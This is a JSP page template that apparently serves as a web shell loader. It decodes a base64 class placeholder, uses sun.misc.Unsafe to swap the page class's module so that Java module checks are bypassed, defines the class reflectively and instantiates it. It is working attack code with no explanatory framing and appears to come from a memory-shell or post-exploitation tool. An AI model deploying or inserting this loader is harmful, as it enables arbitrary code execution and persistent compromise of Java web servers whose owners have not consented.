<%@ page import="java.lang.*" %>
<%@ page import="java.lang.Class" %>
<%@ page import="java.lang.ClassLoader" %>
<%@ page import="java.lang.ClassNotFoundException" %>
<%@ page import="java.lang.Integer" %>
<%@ page import="java.lang.Long" %>
<%@ page import="java.lang.Object" %>
<%@ page import="java.lang.String" %>
<%@ page import="java.lang.Thread" %>
<%@ page import="java.lang.Throwable" %>
<%
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    try {
        Class base64Clz = classLoader.loadClass("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
    }
    Object unsafe = null;
    Object rawModule = null;
    long offset = 48;
    java.lang.reflect.Method getAndSetObjectM = null;
    try {
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        unsafe = unsafeField.get(null);
        rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
        Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
        java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", java.lang.reflect.Field.class);
        offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
        getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
        getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
    } catch (Throwable ignored) {
    }
    java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
    java.lang.reflect.Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
    defMethod.setAccessible(true);
    Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, bytecode, 0, bytecode.length);
    if (getAndSetObjectM != null) {
        getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
    }
    clazz.newInstance();
%>